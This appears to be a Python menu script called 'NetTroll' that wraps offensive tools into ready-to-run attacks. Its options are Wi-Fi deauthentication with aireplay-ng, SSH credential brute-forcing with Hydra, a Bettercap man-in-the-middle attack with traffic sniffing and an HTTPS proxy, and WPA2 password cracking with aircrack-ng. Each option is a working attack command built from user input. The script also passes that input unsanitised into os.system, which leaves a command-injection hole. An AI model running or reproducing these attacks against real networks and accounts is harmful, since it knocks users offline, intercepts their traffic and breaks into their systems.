import os 

BLACK ="\033[0;30m"
RED ="\033[0;31m"
GREEN ="\033[0;32m"
BROWN ="\033[0;33m"
BLUE ="\033[0;34m"
PURPLE ="\033[0;35m"
CYAN ="\033[0;36m"
LIGHT_GRAY ="\033[0;37m"
DARK_GRAY ="\033[1;30m"
LIGHT_RED ="\033[1;31m"
LIGHT_GREEN ="\033[1;32m"
YELLOW ="\033[1;33m"
LIGHT_BLUE ="\033[1;34m"
LIGHT_PURPLE ="\033[1;35m"
LIGHT_CYAN ="\033[1;36m"
LIGHT_WHITE ="\033[1;37m"

while True:
 def banner():
  print(fr"""{LIGHT_PURPLE}
     __     _  _____           _ _ 
  /\ \ \___| |/__   \_ __ ___ | | |
 /  \/ / _ \ __|/ /\/ '__/ _ \| | |
{PURPLE}/ /\  /  __/ |_/ /  | | | (_) | | |
\_\ \/ \___|\__\/   |_|  \___/|_|_|
                                   
{LIGHT_WHITE} By @yyLevi""")
 
 banner()
 print(f"\n{LIGHT_GREEN}[1] Enter Monitor Mode & Airodump-ng - airmon-ng")
 print(f"{LIGHT_CYAN}[2] Start Deauth - Aireplay-ng")
 print(f"{YELLOW}[3] {LIGHT_RED}SSH Brute Force,{YELLOW} - Hydra ")
 print(f"{LIGHT_WHITE}[4] Man In The Middle - Bettercap")
 print(f"{LIGHT_PURPLE}[5] {LIGHT_BLUE}Crack {LIGHT_WHITE}Wpa2{LIGHT_BLUE} Passwords - aircrack-ng ")
 print(f"\n{LIGHT_PURPLE}Remember {LIGHT_WHITE}Ctrl+C{LIGHT_PURPLE} Will Bring You Back, {LIGHT_GREEN}ONLY WHEN IN TOOL SCREEN")
 
 def hydra():
   print("\n[1] ssh password brute force")
   print("[2] ssh username brute force")
   print("[3] ssh username & password brute force\n")
   while True:
    choice = input("\033[0mAnswer: ")
    if choice == "1":
     passwd_list = input(f"Enter Your Targets Password OR Type 'show' to locate the wordlist: ")
     if passwd_list == "show":
      check = input(f"Enter Your .txt Name: {LIGHT_GREEN}")
      os.system(f"locate {check}")
     else:
      username = input(f"Enter Your Target Username: ")
      host_ip = input(f"Enter Host_IP: ")
      threads = input(f"Enter The Amount of Threads: ")
      os.system(f'hydra -l {username} -P {passwd_list} -t {threads} ssh://{host_ip}')
    elif choice == "2":
     passwd = input(f"Enter Your Target Username OR Type 'show' to locate the wordlist: ")
     if passwd == "show":
      check = input(f"Enter Your .txt Name: {LIGHT_GREEN} ")
      os.system(f"locate {check}")
     else:
      username_list = input(f"Enter Your Username list: ")
      host_ip = input(f"Enter Host_IP: ")
      threads = input(f"Enter The Amount of Threads: ")
      os.system(f'hydra -L {username_list} -p {passwd} -t {threads} ssh://{host_ip}')
    elif choice == "3":
     pass_list = input(f"Enter Your Password list OR Type 'show' to locate the wordlist: ")
     if pass_list == "show":
      check = input(f"Enter Your .txt Name: {LIGHT_GREEN}")
      os.system(f"locate {check}")
     else:
      user_list = input(f"Enter Your Username list: ")
      host_ip = input(f"Enter Host_IP: ")
      threads = input(f"Enter The Amount of Threads: ")
      os.system(f'hydra -L {user_list} -P {pass_list} -t {threads} ssh://{host_ip}')
 which = input(f"{LIGHT_RED}Which One:{LIGHT_WHITE} ")
 if which == "1":
  interface = input(f"Enter Your Interface: ")
  start_monitor_mode = f"sudo airmon-ng start {interface}"
  os.system(start_monitor_mode)

  kill_process = "sudo airmon-ng check kill"
  os.system(kill_process)

  auto_airodump = f"sudo airodump-ng {interface}"
  os.system(auto_airodump)
 elif which == "2":
  interface = input(f"Enter Your Interface: ")
  os.system("clear")
  ent_ch = input(f"Enter Your Targets Network Channel: ")
  os.system(f"sudo iwconfig {interface} channel {ent_ch}")
  ap = input(f"Enter The Access Point: ")
  bssid = input(f"Enter The Targets Bssid ")
  os.system(f"sudo aireplay-ng -0 0 -a {ap} -c {bssid} {interface}")
 elif which == "3":
  hydra()
 elif which == "4":
  inf = input(f"Enter Your Interface: ")
  os.system(f"sudo bettercap -iface {inf} -eval 'net.sniff on; https.proxy on; net.probe on'")
 elif which == "5":
  aircrack = input("Enter Your Password List, OR Type 'show' to locate wordlist: ")
  if aircrack == "show":
   locate = input(f"Locate Your Wordlist, Enter .txt Name: {LIGHT_GREEN} ")
   os.system(f"locate {locate}")
  else:
   pcap = input("Enter Your .Pcap File, OR Type 'find' To Check Your Dir For The pcap File: ")
   if pcap == "find":
    os.system("ls")
    pcap = input(f"Enter Your .Pcap File: {LIGHT_GREEN} ")
   os.system(f"aircrack-ng -w {aircrack} {pcap}")
